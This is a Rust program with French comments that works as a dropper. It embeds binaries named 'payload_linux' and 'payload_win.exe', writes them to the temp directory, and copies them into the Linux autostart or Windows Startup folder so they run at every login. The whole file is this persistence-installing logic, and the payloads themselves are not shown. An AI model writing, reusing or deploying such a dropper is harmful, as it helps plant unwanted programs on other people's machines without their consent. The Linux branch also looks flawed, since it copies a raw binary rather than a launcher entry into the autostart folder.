use std::env;
use std::fs;
use std::process::Command;
use std::path::{Path, PathBuf};

const CERTIFICATE: &[u8] = include_bytes!("assets/mycert.der");

fn get_startup_folder(os: &str) -> Option<PathBuf> {
    if os == "linux" {
        // Dossier de démarrage Linux : ~/.config/autostart/
        let mut path = dirs::home_dir().unwrap();
        path.push(".config/autostart");
        Some(path)
    } else if os == "windows" {
        // Dossier de démarrage Windows : %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
        let app_data = env::var("APPDATA").unwrap();
        let mut path = PathBuf::from(app_data);
        path.push(r"Microsoft\Windows\Start Menu\Programs\Startup");
        Some(path)
    } else {
        None
    }
}

fn main() {
    let os = env::consts::OS;
    let tmp_dir = env::temp_dir();
    let startup_folder = get_startup_folder(os);

    if let Some(startup_path) = startup_folder {
        // Vérifie si le dossier de démarrage existe, sinon crée-le
        if !startup_path.exists() {
            fs::create_dir_all(&startup_path).unwrap();
        }

        if os == "linux" {
            println!("Installation sous Linux...");

            // Créer un fichier temporaire pour le binaire Linux
            let linux_bin_path = tmp_dir.join("payload_linux");
            fs::write(&linux_bin_path, include_bytes!("assets/payload_linux")).unwrap();

            // Rendre le fichier exécutable
            Command::new("chmod").arg("+x").arg(&linux_bin_path).output().unwrap();

            // Copier dans le dossier de démarrage Linux
            let dest_path = startup_path.join("mon_programme_linux");
            fs::copy(&linux_bin_path, dest_path).unwrap();
        } else if os == "windows" {
            println!("Installation sous Windows...");

            // Créer un fichier temporaire pour le binaire Windows
            let windows_bin_path = tmp_dir.join("payload_win.exe");
            fs::write(&windows_bin_path, include_bytes!("assets/payload_win.exe")).unwrap();

            // Copier dans le dossier de démarrage Windows
            let dest_path = startup_path.join("payload_win.exe");
            fs::copy(&windows_bin_path, dest_path).unwrap();
        } else {
            println!("OS non supporté.");
        }

        println!("Installation terminée !");
    } else {
        println!("Impossible de trouver le dossier de démarrage pour cet OS.");
    }
}
